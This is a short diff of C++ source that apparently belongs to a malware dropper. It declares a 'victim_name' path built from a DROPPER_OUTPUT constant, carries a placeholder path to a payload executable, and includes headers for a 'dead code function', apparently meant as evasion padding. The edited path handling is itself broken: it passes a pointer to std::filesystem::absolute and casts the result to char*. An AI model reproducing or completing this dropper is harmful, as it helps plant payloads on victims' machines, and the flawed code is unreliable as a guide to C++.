@@ -27,6 +27,7 @@
 #include<string>
 #include<algorithm>
 #include<vector>
+#include<filesystem>
 
 // Imports for the dead code function
 #include<commctrl.h>
@@ -60,9 +61,9 @@ void set_name();
 char name[10 * NAME_SIZE];
 
 // (char*) C:\\example\\path\\to\\your\\payload.exe
-std::filepath::path victim_name = DROPPER_OUTPUT;
+std::filesystem::path relative_file_path_name = DROPPER_OUTPUT;
 
-victim_name = std::filepath::absolute(&victim_name);
+char* victim_name = (char*) std::filesystem::absolute(&relative_file_path_name);
 
 // Entry Point
 int main(int argc, char* argv[])
